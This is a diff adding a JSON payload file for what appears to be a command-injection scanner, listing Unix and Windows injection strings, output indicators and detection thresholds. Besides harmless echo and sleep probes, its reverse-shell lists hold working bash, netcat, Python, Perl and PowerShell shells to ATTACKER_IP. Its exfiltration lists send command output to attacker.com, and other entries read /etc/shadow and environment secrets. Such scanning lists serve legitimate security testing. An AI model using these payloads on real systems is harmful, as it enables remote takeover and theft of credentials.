@@ -1,0 +1,202 @@
+{
+  "payloads": {
+    "unix_generic": {
+      "echo_based": [
+        "; echo COMMAND_TEST",
+        "| echo COMMAND_TEST",
+        "& echo COMMAND_TEST",
+        "&& echo COMMAND_TEST",
+        "|| echo COMMAND_TEST",
+        "`echo COMMAND_TEST`",
+        "$(echo COMMAND_TEST)",
+        "; echo COMMAND_TEST #",
+        "| cat /etc/passwd",
+        "& whoami",
+        "&& id",
+        "'; echo COMMAND_TEST #",
+        "\" ; echo COMMAND_TEST #",
+        "| nc -e /bin/sh attacker.com 4444",
+        "; curl http://attacker.com/shell.sh | sh"
+      ],
+      "time_based": [
+        "; sleep 5",
+        "| sleep 5",
+        "& sleep 5",
+        "&& sleep 5",
+        "`sleep 5`",
+        "$(sleep 5)",
+        "; ping -c 5 127.0.0.1",
+        "; sleep 3 #",
+        "'; sleep 5 #",
+        "\" ; sleep 5 #",
+        "; timeout 10 sleep 5",
+        "; for i in {1..5}; do sleep 1; done"
+      ],
+      "file_operations": [
+        "; cat /etc/passwd",
+        "| cat /etc/shadow",
+        "& ls -la /",
+        "&& ls -la /home",
+        "; find / -name 'config.php' 2>/dev/null",
+        "| head -20 /var/log/auth.log",
+        "; cat /proc/self/environ",
+        "; whoami",
+        "; id",
+        "; uname -a",
+        "; pwd",
+        "| grep -r 'password' /etc 2>/dev/null",
+        "&& find /tmp -type f -name '*.conf'",
+        "; iptables -L",
+        "| ps aux"
+      ],
+      "reverse_shell": [
+        "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+        "| sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+        "&& nc -e /bin/bash ATTACKER_IP 4444",
+        "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "; perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">& S\");open(STDOUT,\">& S\");open(STDERR,\">& S\");system(\"/bin/sh -i\");'",
+        "| /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+      ]
+    },
+    "windows_generic": {
+      "echo_based": [
+        "& echo COMMAND_TEST",
+        "| echo COMMAND_TEST",
+        "&& echo COMMAND_TEST",
+        "|| echo COMMAND_TEST",
+        "` echo COMMAND_TEST`",
+        "| whoami",
+        "& systeminfo",
+        "&& ipconfig",
+        "\" & echo COMMAND_TEST #",
+        "' & echo COMMAND_TEST #",
+        "| tasklist",
+        "& net user",
+        "&& dir C:\\\\",
+        "; echo COMMAND_TEST",
+        "| type C:\\Windows\\win.ini"
+      ],
+      "time_based": [
+        "& timeout 5",
+        "| ping -n 5 127.0.0.1",
+        "&& ping -n 5 127.0.0.1",
+        "\" & timeout 5 #",
+        "' & timeout 5 #",
+        "| timeout /t 5 /nobreak",
+        "& for /l %i in (1,1,5) do @ping -n 1 127.0.0.1 >nul"
+      ],
+      "file_operations": [
+        "& type C:\\Windows\\win.ini",
+        "| dir C:\\",
+        "&& dir C:\\Users",
+        "| type C:\\\\config.php",
+        "& findstr /R /S 'password' C:\\",
+        "| tasklist /v",
+        "&& systeminfo",
+        "| net localgroup",
+        "& wmic logicaldisk get name",
+        "| certutil -hashfile C:\\Windows\\System32\\kernel32.dll",
+        "& dir /s /b C:\\\\*.conf",
+        "| type C:\\Program Files\\apache\\conf\\httpd.conf"
+      ],
+      "reverse_shell": [
+        "& powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')\"",
+        "| powershell -c \"\\$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);\\$stream = \\$client.GetStream();[byte[]]\\$buffer = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$buffer, 0, \\$buffer.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$buffer,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\"",
+        "& nc -e cmd.exe ATTACKER_IP 4444"
+      ]
+    },
+    "blind_detection": {
+      "time_based": [
+        "; sleep(3)",
+        "'; sleep(3) //",
+        "\"; sleep(3) //",
+        "&& sleep 3",
+        "| timeout 3"
+      ],
+      "dns_exfiltration": [
+        "; nslookup $(whoami).attacker.com",
+        "| dig $(id).attacker.com",
+        "&& host $(uname -a).attacker.com",
+        "'; nslookup whoami.attacker.com //"
+      ],
+      "http_exfiltration": [
+        "; curl http://attacker.com/$(whoami)",
+        "| wget http://attacker.com/log?data=$(id)",
+        "&& fetch http://attacker.com/?whoami=$(whoami)"
+      ],
+      "conditional_output": [
+        "; echo COMMAND_TEST && echo VERIFIED",
+        "| echo COMMAND_TEST | echo VERIFIED",
+        "& echo COMMAND_TEST && echo VERIFIED",
+        "; echo 'COMMAND_TEST' #"
+      ]
+    }
+  },
+  "indicators": {
+    "unix_output": [
+      "COMMAND_TEST",
+      "VERIFIED",
+      "root:",
+      "bin/",
+      "/home/",
+      "/bin/",
+      "/usr/",
+      "total ",
+      "drwx",
+      "-rwx",
+      "uid=",
+      "gid=",
+      "groups=",
+      "Linux",
+      "GNU bash",
+      "sh:",
+      "bash:",
+      "/dev/tcp"
+    ],
+    "windows_output": [
+      "COMMAND_TEST",
+      "VERIFIED",
+      "Windows",
+      "Administrator",
+      "C:\\\\",
+      "Program Files",
+      "Volume in drive",
+      "Directory of",
+      "System32",
+      "Ethernet adapter",
+      "ipconfig",
+      "tasklist",
+      "cmd.exe",
+      "powershell",
+      "systeminfo",
+      "wmic",
+      "net user"
+    ],
+    "error_indicators": [
+      "sh: ",
+      "bash: ",
+      "command not found",
+      "is not recognized",
+      "cmd.exe",
+      "powershell",
+      "Access Denied",
+      "Permission denied",
+      "No such file",
+      "syntax error"
+    ],
+    "time_based_confirm": [
+      "sleep: ",
+      "timeout: ",
+      "ping statistics",
+      "Reply from",
+      "Received = "
+    ]
+  },
+  "detection_config": {
+    "time_delay_threshold": 3.0,
+    "time_delay_multiplier": 2.5,
+    "echo_confidence_threshold": 0.85,
+    "conditional_confidence_threshold": 0.90,
+    "max_payload_test_count": 10
+  }
+}
